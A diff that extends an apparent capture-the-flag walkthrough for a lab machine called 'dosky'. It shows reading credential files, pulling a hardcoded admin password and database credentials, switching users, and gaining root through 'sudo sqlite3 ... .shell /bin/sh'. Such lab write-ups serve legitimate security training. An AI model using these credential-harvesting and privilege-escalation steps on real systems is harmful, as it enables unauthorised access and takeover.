@@ -122,3 +122,65 @@ dosky@dosky:~$
 <p>And we got a reverse shell!!!</p>
 
 <h3 align="center">Linux Enumeration</h3>
+
+<p>We have access to the machine, but we realize that there is a lot of content to be examined, so let's get straight to the point.<br><br> At the root of the system we have a file called <b>.important.txt</b>, this file has important information, dosky's password.</p>
+
+```
+dosky@dosky:/$ cat .important.txt
+
+I changed the user Dosky password to: ************
+it's easier and everyone will be allowed to handle that user.
+
+```
+
+<p>The shell we have is not so good so we can connect via ssh with the password we have now.</p>
+<p>In the dosky user home folder we have the dosky service, which was exploited to give us access to the machine, in this file pythos has the access passwords for the server as well as the username. Looking better you can find the flag.</p>
+
+```
+
+                if user == "admin":
+                    if passwd == "35e50bad096e65cebe00974daed9beec":
+                        print("logged sussfully")
+                        logs = """
+
+```
+
+<p>To obtain the first flag, we must connect to the server with Dosky_Client and login with the credentials.<br><br>The web application is found in a folder on the dosky home</p>
+
+<p>it has a database of type sqlite3 that has Hanny's credentials to enter her dashboad, a senha para acessar o usuário de hanny é a mesma.</p>
+
+```
+dosky@dosky:~/Web_Site_v2$ cat auth.db
+
+###[#tableauthauthCREATE TABLE "auth" (
+        "user"  TEXT NOT NULL,
+        "passwd"        TEXT NOT NULL
++hanny@dosky.com********
+
+dosky@dosky:~/Web_Site_v2$ su hanny
+password:
+hanny@dosky:/home/dosky/Web_Site_v2$ 
+```
+
+<p>After switching users we can access hanny's home and find the second flag.</p>
+
+```
+hanny@dosky:~$ ls
+SSH-Honeypot  user.txt
+hanny@dosky:~$
+```
+
+<h3 align="center">Privilege Escaletion</h3>
+
+<p>To elevate our privilege on the machine there are some things we can do such as using LinPeas or tools like this. </p>
+<p>But by running the command <b>sudo -l</b> we realize that we have the possibility to run the <b>SQLIte3</b> as a super user.</p>
+<p>Ok! so running the command we can elevate our privilege.</p>
+
+```
+sudo sqlite3 /dev/null '.shell /bin/sh'
+```
+
+<p>Now we can go to the root's home and get the flag.</p>
+
+<h5 align="center">The End</h5>
+
